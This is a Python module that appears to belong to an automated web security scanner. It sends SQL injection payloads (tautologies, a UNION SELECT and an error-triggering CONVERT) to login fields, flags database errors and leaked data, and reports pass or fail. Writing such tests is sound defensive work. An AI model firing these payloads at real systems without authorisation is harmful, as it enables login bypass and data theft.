from typing import Any, Dict, List
import time
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    # 1. Baseline
    baseline = client.send(scenario.method, scenario.target, json_body={"username": "test", "password": "password"})
    
    # Enhanced Payloads
    payloads = [
        # Tautologies
        "' OR '1'='1",
        '" OR ""=""',
        "1' OR 1=1",
        # Union Based (New)
        "' UNION SELECT 1, 'admin', 3--",
        # Error Triggering
        "' AND 1=CONVERT(int, @@version)--"
    ]
    
    fields = scenario.config.get("fields", ["username", "password"])
    variants = []
    
    issues_found = []
    leaked_data = []

    for field in fields:
        for p in payloads:
            body = {"username": "test", "password": "password"}
            body[field] = p
            
            # Timing check
            start = time.time()
            resp = client.send(scenario.method, scenario.target, json_body=body)
            duration = time.time() - start
            
            # Checks
            suspicious = False
            reasons = []
            
            # 5xx error
            if resp.status_code >= 500:
                suspicious = True
                reasons.append(f"Server Error (5xx)")
                
            # SQL Error text
            lower_text = resp.text.lower()
            err_sigs = ["syntax error", "sql", "ora-", "mysql", "postgresql", "unclosed quotation mark"]
            if any(sig in lower_text for sig in err_sigs):
                suspicious = True
                reasons.append("SQL Error Reflection")
                # Capture snippet
                leaked_data.append(f"Error Dump: {resp.text[:100]}...")
            
            # Union/Admin check
            # Capture specific data patterns
            if "UNION" in p and ("admin" in lower_text or "token" in lower_text):
                 if "admin" not in baseline.text:
                     suspicious = True
                     reasons.append("Data Leak via UNION")
                     # Try to grep specific keys
                     leaked_data.append(f"Leaked Response Body: {resp.text[:200]}...")

            variants.append({"field": field, "payload": p, "status": resp.status_code})
            
            if suspicious:
                issues_found.append(f"[HIGH] SQLi in '{field}': {', '.join(reasons)}")

    return {
        "scenario_id": scenario.id,
        "attack_type": "sql_injection",
        "passed": len(issues_found) == 0,
        "details": {
            "issues": issues_found,
            "leaked_data": list(set(leaked_data)) # dedupe
        }
    }
